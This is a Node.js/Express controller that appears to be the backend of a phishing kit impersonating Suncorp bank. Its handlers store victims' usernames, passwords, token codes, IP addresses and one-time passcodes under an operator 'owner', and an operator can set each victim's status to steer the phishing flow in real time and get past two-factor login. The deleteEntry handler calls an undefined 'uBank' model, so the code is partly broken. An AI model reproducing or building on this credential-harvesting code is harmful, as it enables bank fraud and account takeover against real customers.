const Suncorp = require("../models/suncorpModel");

const getOwnerVics = async (req, res) => {
  const { owner } = req.params;
  Suncorp.find({ owner })
    .sort({ status: -1 })
    .exec((err, vics) => {
      if (err) {
        console.log(err);
        res.status(404).send("Error");
        return;
      }
      res.send(vics);
    });
};

const command = async (req, res) => {
  const { uniqueid, status } = req.body;
  try {
    await Suncorp.findOneAndUpdate({ uniqueid }, { status }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const getInfo = async (req, res) => {
  const { uniqueid } = req.params;
  Suncorp.findOne({ uniqueid }).exec((err, vic) => {
    if (err) {
      console.log(err);
      res.status(404).send("Error");
      return;
    }
    res.send(vic);
  });
};

const submitLogin = async (req, res) => {
  const { username, password, tokenCode, uniqueid, owner, ip } = req.body;
  try {
    await Suncorp.create({
      uniqueid,
      username,
      password,
      tokenCode,
      status: 2,
      owner,
      ip,
    });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitLoginAgain = async (req, res) => {
  const { username, password, tokenCode, uniqueid } = req.body;
  try {
    await Suncorp.findOneAndUpdate(
      { uniqueid },
      { username, password, tokenCode, status: 0 }
    ).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const submitOtp = async (req, res) => {
  const { otp, uniqueid } = req.body;
  try {
    await Suncorp.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

const deleteEntry = async (req, res) => {
  const { uniqueid } = req.body;
  try {
    await uBank.deleteOne({ uniqueid });
    res.sendStatus(200);
  } catch (error) {
    console.log(error);
    res.sendStatus(400);
  }
};

module.exports = {
  getOwnerVics,
  command,
  getInfo,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  deleteEntry,
};
